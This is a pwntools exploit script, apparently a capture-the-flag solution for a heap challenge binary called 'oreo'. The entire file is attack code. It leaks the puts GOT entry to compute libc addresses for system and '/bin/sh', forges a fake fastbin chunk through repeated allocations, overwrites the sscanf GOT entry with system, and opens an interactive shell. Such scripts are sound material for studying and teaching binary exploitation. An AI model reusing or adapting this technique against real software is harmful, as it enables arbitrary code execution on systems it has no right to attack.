from pwn import *

p = process('./oreo')
context.log_level = 'debug'
elf = ELF('oreo')
libc = ELF('libc.so')

def add(name,description) :
    p.sendline('1')
    p.sendline(name)
    p.sendline(description)

def showadd() :
    p.sendline('2')

def order() :
    p.sendline('3')

def leavemessage(message) :
    p.sendline('4')
    p.sendline(message)

def showstats() :
    p.sendline('5')

puts_got = elf.got['puts']
add(27*'A'+p32(puts_got),'A'*25)
showadd()
p.recvuntil('===================================\n')
p.recvuntil('Name: \n')
p.recvuntil('Description: ')
p.recvuntil('Name: \n')
p.recvuntil('Description: ')
data = u32(p.recv(4))
print hex(data)

#leak -->system
database = data - libc.symbols['puts']
system_addr = database + libc.symbols['system']
bin_addr = database + libc.search('/bin/sh').next()
print '[*] the system addr :',hex(system_addr)
print '[*] the bin_sh addr :',hex(bin_addr)

#for --> add --> 0x41
for i in range(60) :
    add('A'*27 + p32(0x0),'A')
    order()

add('A'*27+p32(0x0),'AAAA')
add('AAAA','AAAA')
order()

#message_addr --> sscan_got_addr
payload = 'AAA' + 'A'*24 + p32(0x0) + 'AAAA' + p32(0x41) + p32(0x804A2a0)
add(payload,'AAAA')
add('BBBB','BBBB')
sscanf_addr = elf.got['__isoc99_sscanf']
add('CCCC',p32(sscanf_addr))

#sscanf_got_addr --> system_addr
payload2 = p32(system_addr)
gdb.attach(p)
leavemessage(payload2)

p.interactive()
